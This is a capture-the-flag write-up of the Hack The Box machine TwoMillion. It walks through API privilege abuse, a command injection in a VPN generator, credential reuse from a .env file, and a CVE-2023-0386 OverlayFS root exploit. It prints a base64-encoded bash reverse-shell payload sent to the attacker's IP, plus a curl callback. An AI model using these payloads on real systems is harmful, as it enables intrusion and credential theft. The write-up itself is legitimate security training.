---
title: Hack the Box - TwoMillion
time: 2025-11-17 12:00:00
categories: [htb, easy]
image: 'assets/img/2million.png'

---

<!-- <link rel="shortcut icon" type="image/png" href="{{ "/assets/img/cat.jpg" }}"> -->

2million is an Easy Linux machine centered around abusing insecure API endpoints and exploiting command injection in the admin VPN generator. After elevating a normal user to admin through a misconfigured settings update API, the VPN generator can be manipulated to gain remote code execution. From there, database credentials allow SSH access as a more privileged user, and the final privesc is achieved through an OverlayFS kernel exploit. The machine highlights client-side analysis, API abuse, command injection, and kernel-level privilege escalation.

<img width="922" height="128" alt="image" src="https://github.com/user-attachments/assets/7229deb4-bd59-4e88-ba97-9938aae9f517" />

## Recon
### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80). The HTTP service redirects to 2million.htb, so add it to `/etc/hosts`.

```bash
╰─ nmap -p- -v --min-rate 1000 10.10.11.221             
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-19 22:06 +08
Initiating Ping Scan at 22:06
Scanning 10.10.11.221 [2 ports]
Completed Ping Scan at 22:06, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:06
Completed Parallel DNS resolution of 1 host. at 22:06, 0.01s elapsed
Initiating Connect Scan at 22:06
Scanning 10.10.11.221 (10.10.11.221) [65535 ports]
Discovered open port 22/tcp on 10.10.11.221
Discovered open port 80/tcp on 10.10.11.221
..............
[SNIP]
..............

╰─ nmap -p 22,80 -sCV 10.10.11.221             
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-19 22:09 +08
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```

#### 2million.htb - TCP 80 (nginx HTTP)

Navigate to http://2million.htb/, we were given a website that looks like a Hack The Box website. 

<img width="1057" height="412" alt="image" src="https://github.com/user-attachments/assets/10c87646-a7f4-4241-9a3a-a45f8e863549" />

There is a login page `/login`, since we dont have any account, we probably need to find any register page available.
<img width="945" height="488" alt="image" src="https://github.com/user-attachments/assets/0cf23b81-5f48-4b0a-b683-164ac58b4a07" />

By using Feroxbuster, we can enumerate avallable directories, there are several interseting one like /api/v1, /register and /js/inviteapi.js. 

<img width="1174" height="521" alt="image" src="https://github.com/user-attachments/assets/c234e3a1-4cec-4ce2-8703-f06b0e516a3c" />

The register page requires an invite code, so we need to figure out how to generate one.

<img width="687" height="458" alt="image" src="https://github.com/user-attachments/assets/ccce510e-9726-4472-8e39-9c9bbb23b75c" />

#### Source Code Review

During initial enumeration of the web application, we inspected the HTML source of the register page. The page loads two JavaScript files:
```js
<script src="/js/htb-frontend.min.js"></script>
<script defer src="/js/inviteapi.min.js"></script>
```
The first is just UI logic, but `inviteapi.min.js` is likely responsible for invite-code generation for users onboarding.

#### Deobfuscating inviteapi.min.js

The file is heavily obfuscated using a typical packed JavaScript function:
```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
This is a common obfuscation structure (Dean Edwards packer). Tools like <a href="https://lelinhtinh.github.io/de4js/">de4js</a>, JSNice, or even ChatGPT can fully deobfuscate it.
Running it through de4js yields two clear functions:

```js
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```
** Analysis **

| Function | 	Endpoint | Auth Required | Purpose |
| ------------ | ----------| ------------| -------- |
| verifyInviteCode(code) | 	`/api/v1/invite/verify`	| No |	Validate user-provided invite | 
| makeInviteCode() | 	`/api/v1/invite/how/to/generate` | 	No | 	Provides hint on how to generate invite | 

You can run `makeInviteCode()` in the browser console.

<img width="1045" height="130" alt="image" src="https://github.com/user-attachments/assets/d403da45-194a-45b9-b4a0-fe41f565f849" />

Another way is to send a POST request to the API using curl or Burp Suite. 
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate                                                     
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type..."
}
```

The server openly tells us the encoding type. This is an insecure design pattern (security through ROT13 obscurity).

<img width="690" height="468" alt="image" src="https://github.com/user-attachments/assets/8f51eac6-797b-4fe8-8668-266504a2517b" />

Now that we know the endpoint, we request it:
```bash
curl -X POST http://2million.htb/api/v1/invite/generate                              
{"0":200,"success":1,"data":{"code":"Sjg5QlctNzlJNkItUjdSSlMtSjJESFA=","format":"encoded"}}%        
```
The server again hints the code is “encoded.” This is base64—another sign of weak obfuscation
<img width="1100" height="506" alt="image" src="https://github.com/user-attachments/assets/bca005cb-aaa4-46c6-a105-bec68780a76a" />


Using the final code, you can now create an account and access authenticated functionality of the application.

#### API Enumeration

After registering via the invite mechanism, the `/home` page exposes a feature allowing authenticated users to download their own VPN connection pack, similar to HackTheBox’s own VPN generator.

<img width="1352" height="501" alt="image" src="https://github.com/user-attachments/assets/8e4cf6c6-ee27-4ee6-9cfb-4d92b76d5c26" />

Hovering over the "Connection Pack" button reveals that the application makes a GET request to `http://2million.htb/api/v1/user/vpn/generate`

<img width="1172" height="420" alt="image" src="https://github.com/user-attachments/assets/82429c13-6fd2-4374-ad96-59845b9c8e21" />

A quick hit on the root API path gives us:

GET `/api`
```bash
curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api
{ "/api/v1": "Version 1 of the API" }
```
GET `/api/v1`
```bash
curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1
{
    "v1": {
        "user": {
            "GET": {
                "/api/v1": "Route List",
                "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate": "Generate invite code",
                "/api/v1/invite/verify": "Verify invite code",
                "/api/v1/user/auth": "Check if user is authenticated",
                "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                "/api/v1/user/vpn/download": "Download OVPN file"
            },
            "POST": {
                "/api/v1/user/register": "Register a new user",
                "/api/v1/user/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "/api/v1/admin/auth": "Check if user is admin"
            },
            "POST": {
                "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "/api/v1/admin/settings/update": "Update user settings"
            }
        }
    }
}
```

The admin section is of immediate interest. We can check whether we have an admin role or not. If we have an admin, then we can generate VPN file through `POST` request (different from user API through `GET`)

First, we check our current role using `/api/v1/admin/auth`. The response shows that we are not an admin.
```bash
curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1/admin/auth
{"message":false}
```

Try updating user settings via the `api/v1/admin/settings/update` endpoint. We successfully updated our own role without any authorisation on the endpoint.

```bash                                                                                                                                               
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" \
  -H "Content-Type: application/json" \
  --data '{"email":"arifpeycal@gmail.com","is_admin":1}'

{"id":16,"username":"arif2002","is_admin":1}%
```
Confirming our admin access through  `/api/v1/admin/auth` and we are now an admin.
```bash                                                                                                                   
curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1/admin/auth
{"message":true}
```
## Shell as www-data

#### Command Injection

Since we have an admin role, we can try to generate the VPN file. We get an error for content type, hence we need to include Content-Type header.
```bash
 curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Invalid content type."}%
```

Need to include username.

```bash                                                                                                        
curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Missing parameter: username"}%
```
After fixing all errors, a full OVPN file is returned.
```bash
curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --data '{"username":"arif2002"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
```
From the response, it looks like it take our data and use it to generate VPN file. This means the backend is likely calling something like:
```
/usr/bin/genvpn.sh <username>
```

Which is executing shell commands using untrusted input. This opens the door for command injection.

<img width="641" height="452" alt="image" src="https://github.com/user-attachments/assets/6e37cb0d-5cd7-48f0-b94f-37e6b0214324" />

To confirm shell injection, append `&&` after username to add another command. I tried to curl my IP address server, where I run a simple HTTP server using Python.
```bash
curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --data '{"username":"arif2002 && curl 10.10.14.108:8000"}'
```
We receive an inbound request on our Python server.
<img width="713" height="108" alt="image" src="https://github.com/user-attachments/assets/7da8bd39-3ce6-48b8-b888-13c063071265" />

#### Gaining a Reverse Shell
Now we can try to do a reverse shell using bash. I try to use base64 encoding to see if piping to bash also works in this scenario.

Encode payload:
```bash
echo 'bash -i >& /dev/tcp/10.10.14.108/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDgvNDQ0NCAwPiYx
```
Exploit request:
```bash
curl -X POST \
 -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" \
 -H "Content-Type: application/json" \
 http://2million.htb/api/v1/admin/vpn/generate \
 --data '{"username":"arif2002 && echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDgvNDQ0NCAwPiYx | base64 -d | bash"}'

<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>
```
On our listener: we get a shell as www-data
<img width="882" height="297" alt="image" src="https://github.com/user-attachments/assets/600dbddc-a3f5-412d-9732-f63040717b60" />

Reviewing `index.php` reveals that the application reads sensitive configuration values from a `.env` file:
```php
$envFile = file('.env');
...
$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];

```
Since the `.env` file was world-readable by the web server user, it could be directly accessed:
```bash
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ 
```
This immediately exposes valid database and potentially system credentials. The password `SuperDuperPass123` was later reused for the admin SSH account.

## Shell as admin
#### User Flag

Using the recovered credentials, SSH access as admin was successful:
```bash
ssh admin@10.10.11.221    
The authenticity of host '10.10.11.221 (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.221' (ED25519) to the list of known hosts.
admin@10.10.11.221's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
admin@2million:~$ ls
linpeas.sh  snap  user.txt
admin@2million:~$ cat user.txt
1b878e8d5d****************

```
Upon login, the message of the day indicated an email was waiting. Checking `/var/mail/admin` revealed internal communication referencing kernel vulnerabilities:

```bash
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

## Shell as root
Since the box runs `Ubuntu 22.04.2`, and the internal email explicitly references OverlayFS/FUSE issues, `CVE-2023-0386` becomes a prime candidate. This vulnerability allows an unprivileged user to escalate privileges by manipulating OverlayFS permissions to gain arbitrary file capabilities.

<img width="619" height="545" alt="image" src="https://github.com/user-attachments/assets/567db4f7-4672-4f5e-a77e-62dd490eaf80" />

Interestingly, the admin home directory already contained `linpeas.sh` and a folder with the exploit source code, probably another user had used this exploit:

One terminal runs the FUSE helper that sets up lower/upper directories for exploitation:
```bash
admin@2million:/tmp$ cd CVE-2023-0386
admin@2million:/tmp/CVE-2023-0386$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
```

Expected debug output:
```bash
[+] len of gc: 0x3ee0
mkdir: File exists
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```


In another terminal, execute the exploit wrapper:

```bash
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Nov 19 17:08 .
drwxrwxr-x 6 root   root     4096 Nov 19 17:04 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
```
The exploit successfully overwrites file capabilities and spawns a privileged environment:
```bash
root@2million:/tmp/CVE-2023-0386# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
e0fc183e4*******************
```


### Understanding CVE-2023-0386 (OverlayFS/FUSE Privilege Escalation)
 
`CVE-2023-0386` is a privilege escalation vulnerability affecting Ubuntu kernels that use **OverlayFS**, a filesystem commonly used for containers, snaps, and modern Linux systems.

The vulnerability arises from **improper validation of file attributes** when merging a lower and upper filesystem layer. Because of this, an unprivileged user can **inject dangerous file capabilities**, causing the kernel to believe that a regular file has privileged permissions — allowing arbitrary code execution as **root**.

#### 🔍 What is OverlayFS (in simple terms)?

OverlayFS stacks two directories:

| Layer        | Description                    |
| ------------ | ------------------------------ |
| **lowerdir** | Read-only base layer           |
| **upperdir** | Writable layer                 |
| **merged**   | What the process actually sees |

When reading a file, the kernel "merges" these layers and applies metadata from the upper layer.

This merging is where the bug happens.


#### Where the vulnerability occurs

OverlayFS fails to properly restrict which extended attributes can be set by the unprivileged upper layer. A normal user **should NOT** be able to set capability attributes such as:

```
security.capability
```

because if `security.capability` has:
```
cap_setuid, cap_setgid, cap_sys_admin
```
Running the file will lead to the kernel allows it to set UID=0 (root).

#### How the exploit chain works (step-by-step)

The public exploit uses **FUSE** (a userspace filesystem) to craft the malicious lower layer. Here is what actually happens:

**1. Prepare a fake "lowerdir" using FUSE**

The exploit runs a FUSE server to simulate a filesystem that contains a **fake file** with a malicious capability `xattr`.

Example capabilities injected:

* `cap_setuid`
* `cap_setgid`
* or even full root capabilities

**2. Create an "upperdir" on disk**

This is a normal directory under `/tmp`, writable by admin/user.

The exploit stores a normal file there (no special permissions).

**3. Mount an OverlayFS merging the two layers**

The exploit mounts a new OverlayFS instance:

```
lowerdir → fake filesystem served by FUSE
upperdir → normal writable directory (e.g., /tmp/gc)
merged → OverlayFS mount point (e.g., /tmp/ovlcap)
```

During the mount, OverlayFS **merges attributes** from "upperdir" and "lowerdir" like this:
```
metadata = upperdir
xattrs/capabilities = lowerdir
```

The lowerdir (FUSE) lies by providing malicious xattrs:
```
security.capability = CAP_SETUID + CAP_SETGID + root-level perms
```

The upperdir contributes the actual file content.

When OverlayFS merges them, it accidentally creates a file with malicious SUID attributes:

```
-rwsrwxrwx 1 nobody nogroup file
```
So a file owned by "nobody" suddenly gets **SUID root-level capabilities**. This file now has capabilities that allow privilege escalation.

